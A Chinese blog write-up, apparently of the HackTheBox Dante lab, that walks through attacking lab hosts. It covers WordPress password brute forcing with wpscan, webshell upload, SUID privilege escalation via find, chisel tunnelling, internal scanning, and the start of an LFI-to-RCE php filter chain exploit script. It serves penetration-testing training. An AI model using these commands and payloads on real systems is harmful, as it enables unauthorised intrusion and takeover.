class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- Finalize WordPress permission changes - PENDING</span><br><span class="line">- Update links to to utilize DNS Name prior to changing to port 80 - PENDING</span><br><span class="line">- Remove LFI vuln from the other site - PENDING</span><br><span class="line">- Reset James&#x27; password to something more secure - PENDING</span><br><span class="line">- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS</span><br></pre></td></tr></table></figure><p>有以下几点提示需要注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个部署着wordpress的站点，用户的权限需要更改</span><br><span class="line">别的站点存在LFI漏洞</span><br><span class="line">james的密码可能容易被爆破出来</span><br></pre></td></tr></table></figure><p>之后我们用nmap扫一下10.10.110.100：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# nmap -sS -sV -sC -A -p- --min-rate 5000 10.10.110.100  </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 04:08 EDT</span><br><span class="line">Nmap scan report for 10.10.110.100</span><br><span class="line">Host is up (0.31s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.14.6</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_Can&#x27;t get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 8fa2ffcf4e3eaa2bc26ff45a2ad9e9da (RSA)</span><br><span class="line">|   256 07838eb6f7e672e965db42fdedd693ee (ECDSA)</span><br><span class="line">|_  256 1345c5cadba6b4ae9c097d21cd9d74f4 (ED25519)</span><br><span class="line">65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/wordpress DANTE&#123;fake_flag&#125;</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Linux 4.X|5.X (85%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 21/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   ...</span><br><span class="line">2   422.66 ms 10.10.110.100</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 72.58 seconds</span><br></pre></td></tr></table></figure><p>发现还有一个65000的端口被开放，并且还存在一个&#x2F;wordpress目录，还有一个robots.txt，进入拿到flag：</p><p><img src="https://pic.imgdb.cn/item/6462afda0d2dde57771169b2.jpg"></p><h3 id="It’s-easier-this-way"><a href="#It’s-easier-this-way" class="headerlink" title="It’s easier this way"></a>It’s easier this way</h3><p>既然存在一个部署了wordpress，那就用wpscan扫一下吧：</p><p><img src="https://pic.imgdb.cn/item/6461cefc0d2dde5777b62b0c.jpg"></p><p>观察扫描结果，可以看到扫出来了两个用户名，admin和james。回想刚刚的提示，我们可以尝试去爆破一下james的密码。但是密码太多了，为了节约时间先用cewl来给我们生成个字典：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# cewl http://10.10.110.100:65000/wordpress -w password.txt</span><br><span class="line">CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br></pre></td></tr></table></figure><p>之后用wpscan来爆破密码，结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.110.100:65000/wordpress --usernames james -P password.txt </span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.22</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]</span><br><span class="line">[+] Started: Mon May 15 02:14:19 2023</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Reference: https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwenty</span><br><span class="line"> | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.2</span><br><span class="line"> | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2</span><br><span class="line"> | Style Name: Twenty Twenty</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwenty/</span><br><span class="line"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:05 &lt;=================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:05</span><br><span class="line"></span><br><span class="line">[i] Config Backup(s) Identified:</span><br><span class="line"></span><br><span class="line">[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">[SUCCESS] - james / Toyota                                                                                                                                                                                                      </span><br><span class="line">Trying james / Motor Time: 00:00:32 &lt;==================================================================                                                                                      &gt; (400 / 893) 44.79%  ETA: ??:??:??</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: james, Password: Toyota</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon May 15 02:15:12 2023</span><br><span class="line">[+] Requests Done: 540</span><br><span class="line">[+] Cached Requests: 41</span><br><span class="line">[+] Data Sent: 187.165 KB</span><br><span class="line">[+] Data Received: 2.269 MB</span><br><span class="line">[+] Memory used: 262.699 MB</span><br><span class="line">[+] Elapsed time: 00:00:52</span><br></pre></td></tr></table></figure><p>得到一对帐号密码：<code>james:Toyota</code> ，并且发现<a href="http://10.10.110.100:65000/wordpress/.wp-config.php.swp">http://10.10.110.100:65000/wordpress/.wp-config.php.swp</a> 。尝试用该帐号和密码登录后台，发现还是管理员权限：</p><p><img src="https://pic.imgdb.cn/item/6461cfba0d2dde5777b6f4ce.jpg"></p><p>之后在上传主题那里，上传一个webshell，可以在&#x2F;wordpress&#x2F;wp-content&#x2F;uploads看到：</p><p><img src="https://pic.imgdb.cn/item/6461d0230d2dde5777b76827.jpg"></p><p>之后蚁剑连接拿到shell。在home目录下发现还存在一个叫james的用户：</p><p><img src="https://pic.imgdb.cn/item/6461d1b60d2dde5777b96160.jpg"></p><p>继续用之前的密码登录一下拿到flag：</p><p><img src="https://pic.imgdb.cn/item/6462b0350d2dde577711a337.jpg"></p><h3 id="Show-me-the-way"><a href="#Show-me-the-way" class="headerlink" title="Show me the way"></a>Show me the way</h3><p>发现在james用户目录下存在.bash_histroy，以下是内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">james@DANTE-WEB-NIX01:~$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line">cd /home/balthazar</span><br><span class="line">rm .mysql_history</span><br><span class="line">mysql -u balthazar -p TheJoker12345!</span><br></pre></td></tr></table></figure><p>之后尝试SUID提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/6461d2b20d2dde5777bafa82.jpg"></p><p>find命令可以用如下方式提权：</p><p><img src="https://pic.imgdb.cn/item/6462b0540d2dde577711b667.jpg"></p><p><code>find . -exec /bin/sh -p \; -quit</code>进入sh，之后给&#x2F;bin&#x2F;bash设置SUID位，再&#x2F;bin&#x2F;bash -p即可。至此拿到DANTE-WEB-NIX01的root，别忘了添加路由。</p><h3 id="Seclusion-is-an-illusion"><a href="#Seclusion-is-an-illusion" class="headerlink" title="Seclusion is an illusion"></a>Seclusion is an illusion</h3><p>接下来用chisel搭一条代理隧道：</p><p><img src="https://pic.imgdb.cn/item/6461e28d0d2dde5777d29efd.jpg"></p><p>用fscan走这条代理扫一下内网：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">└─# fscan -h 172.16.1.0/24 -socks5 127.0.0.1:1080</span><br><span class="line">​</span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">Socks5Proxy: socks5://127.0.0.1:1080</span><br><span class="line">start infoscan</span><br><span class="line">172.16.1.101:21 open</span><br><span class="line">172.16.1.10:80 open</span><br><span class="line">172.16.1.20:22 open</span><br><span class="line">172.16.1.5:21 open</span><br><span class="line">172.16.1.1:80 open</span><br><span class="line">172.16.1.12:22 open</span><br><span class="line">172.16.1.20:80 open</span><br><span class="line">172.16.1.13:80 open</span><br><span class="line">172.16.1.10:22 open</span><br><span class="line">172.16.1.100:21 open</span><br><span class="line">172.16.1.12:80 open</span><br><span class="line">172.16.1.100:22 open</span><br><span class="line">172.16.1.12:21 open</span><br><span class="line">172.16.1.19:80 open</span><br><span class="line">172.16.1.17:80 open</span><br><span class="line">172.16.1.100:80 open</span><br><span class="line">172.16.1.102:80 open</span><br><span class="line">172.16.1.5:135 open</span><br><span class="line">172.16.1.20:135 open</span><br><span class="line">172.16.1.101:135 open</span><br><span class="line">172.16.1.102:135 open</span><br><span class="line">172.16.1.5:139 open</span><br><span class="line">172.16.1.17:139 open</span><br><span class="line">172.16.1.10:139 open</span><br><span class="line">172.16.1.20:139 open</span><br><span class="line">172.16.1.102:139 open</span><br><span class="line">172.16.1.101:139 open</span><br><span class="line">172.16.1.12:443 open</span><br><span class="line">172.16.1.20:443 open</span><br><span class="line">172.16.1.1:443 open</span><br><span class="line">172.16.1.13:443 open</span><br><span class="line">172.16.1.102:443 open</span><br><span class="line">172.16.1.5:445 open</span><br><span class="line">172.16.1.10:445 open</span><br><span class="line">172.16.1.20:445 open</span><br><span class="line">172.16.1.17:445 open</span><br><span class="line">172.16.1.13:445 open</span><br><span class="line">172.16.1.101:445 open</span><br><span class="line">172.16.1.102:445 open</span><br><span class="line">172.16.1.5:1433 open</span><br><span class="line">172.16.1.12:3306 open</span><br><span class="line">172.16.1.102:3306 open</span><br><span class="line">172.16.1.19:8080 open</span><br><span class="line">172.16.1.20:88 open</span><br><span class="line">172.16.1.17:10000 open</span><br><span class="line">[*] alive ports len is: 45</span><br><span class="line">start vulscan</span><br><span class="line">已完成 0/45 [-] Ms17010 172.16.1.13 EOF</span><br><span class="line">[*] WebTitle: http://172.16.1.1         code:301 len:178    title:301 Moved Permanently 跳转url: https://172.16.1.1/</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.101</span><br><span class="line">   [-&gt;]DANTE-WS02</span><br><span class="line">   [-&gt;]172.16.1.101</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.102</span><br><span class="line">   [-&gt;]DANTE-WS03</span><br><span class="line">   [-&gt;]172.16.1.102</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.5</span><br><span class="line">   [-&gt;]DANTE-SQL01</span><br><span class="line">   [-&gt;]172.16.1.5</span><br><span class="line">[*] WebTitle: http://172.16.1.12        code:302 len:0      title:None 跳转url: http://172.16.1.12/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.19        code:200 len:553    title:Index of /</span><br><span class="line">[*] WebTitle: http://172.16.1.100       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle: http://172.16.1.13        code:302 len:0      title:None 跳转url: http://172.16.1.13/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.17        code:200 len:963    title:Index of /</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.16.1.20</span><br><span class="line">   [-&gt;]DANTE-DC01</span><br><span class="line">   [-&gt;]172.16.1.20</span><br><span class="line">[*] WebTitle: http://172.16.1.10        code:200 len:28842  title:Dante Hosting</span><br><span class="line">[*] WebTitle: https://172.16.1.12       code:302 len:0      title:None 跳转url: https://172.16.1.12/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.102       code:200 len:1237   title:Dante Marriage Registration System :: Home Page</span><br><span class="line">[*] WebTitle: https://172.16.1.102      code:200 len:1237   title:Dante Marriage Registration System :: Home Page</span><br><span class="line">[*] WebTitle: https://172.16.1.13       code:302 len:0      title:None 跳转url: https://172.16.1.13/dashboard/</span><br><span class="line">[*] WebTitle: http://172.16.1.20        code:200 len:3173   title:None</span><br><span class="line">[*] WebTitle: https://172.16.1.1        code:200 len:8999   title:pfSense - Login</span><br><span class="line">[*] WebTitle: https://172.16.1.20       code:200 len:3173   title:None</span><br><span class="line">[+] 172.16.1.20 MS17-010        (Windows Server 2012 R2 Standard 9600)</span><br><span class="line">[*] WebTitle: http://172.16.1.12/dashboard/ code:200 len:7574   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: http://172.16.1.13/dashboard/ code:200 len:7576   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: http://172.16.1.19:8080   code:403 len:793    title:None</span><br><span class="line">[*] WebTitle: https://172.16.1.12/dashboard/ code:200 len:7574   title:Welcome to XAMPP</span><br><span class="line">[*] WebTitle: https://172.16.1.1/       code:200 len:8999   title:pfSense - Login</span><br><span class="line">[*] WebTitle: https://172.16.1.13/dashboard/ code:200 len:7576   title:Welcome to XAMPP</span><br><span class="line">[+] http://172.16.1.20 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">[+] https://172.16.1.20 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">已完成 45/45</span><br><span class="line">[*] 扫描结束,耗时: 8m5.925407215s</span><br></pre></td></tr></table></figure><p>接下来我们看172.16.1.10，刚刚fscan扫到了22,80,139,445这些端口，先进一下web界面吧：</p><p><img src="https://pic.imgdb.cn/item/6461e36f0d2dde5777d3ae2f.jpg"></p><p>随便点旁边一个按钮，注意看上面的链接 ：</p><p><img src="https://pic.imgdb.cn/item/6461e3350d2dde5777d35f82.jpg"></p><p>猜测存在LFI，尝试读一下&#x2F;etc&#x2F;passwd：</p><p><img src="https://pic.imgdb.cn/item/6461e3b20d2dde5777d3f5de.jpg"></p><p>可以读到，并且我们可以看到有一个名为margaret的用户，只是它的shell不是bash而是lshell。因为这个站用的是php，并且存在LFI，所以我们可以构造php filter chain来RCE，关于构造php filter chain来RCE的方法我这里就不过多介绍了，打CTF的师傅们应该接触过，想要了解的可以看看Zedd师傅写的一篇文章：<a href="https://tttang.com/archive/1395/">hxp CTF 2021 – The End Of LFI?</a>。这篇文章从最简单的LFI开始，一步步构造php filter chain从而实现RCE，师傅们看了之后一定会很有收获的。 我这里直接贴脚本吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://172.16.1.10/nav.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;id&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"> </span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span 